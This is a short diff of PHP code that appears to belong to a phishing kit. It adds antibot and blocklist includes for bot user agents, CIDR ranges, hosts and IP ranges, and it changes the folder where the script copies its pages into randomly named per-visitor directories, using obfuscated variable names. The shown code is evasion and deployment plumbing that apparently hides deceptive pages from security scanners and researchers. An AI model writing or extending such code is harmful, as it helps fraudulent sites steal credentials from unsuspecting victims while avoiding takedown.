@@ -3,6 +3,11 @@
     include(__DIR__ . '/files/boot/check1.php');
     include(__DIR__ . '/files/boot/check2.php');
     include(__DIR__ . '/files/boot/antibot.php');
+    include(__DIR__ . '/files/boot/DB-BOTS.php');
+    include(__DIR__ . '/files/boot/DB-CIDR.php');
+    include(__DIR__ . '/files/boot/DB-HOSTS.php');
+    include(__DIR__ . '/files/boot/DB-METHOD.php');
+    include(__DIR__ . '/files/boot/DB-RANGE.php');
     include_once __DIR__ . '/delete.php';
 	
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
@@ -25,7 +30,7 @@ $randomlink = md5($random2);
 
 for ($DIR = '', $i = 0, $do_ll = strlen($a = '123456789')-1; $i != 3; $x = rand(0,$do_ll), $DIR .= $a{$x}, $i++);
 $_SESSION['_DIR_'] = $DIR;
-$DIR = "./id/".$randomlink.$DIR;
+$DIR = "./ids/".$randomlink.$DIR;
 $khkhkhkhkhkhkh="ax";
 function recurse_copy($khkhkhkhkhkhkh,$DIR) {
 $dir = opendir($khkhkhkhkhkhkh);
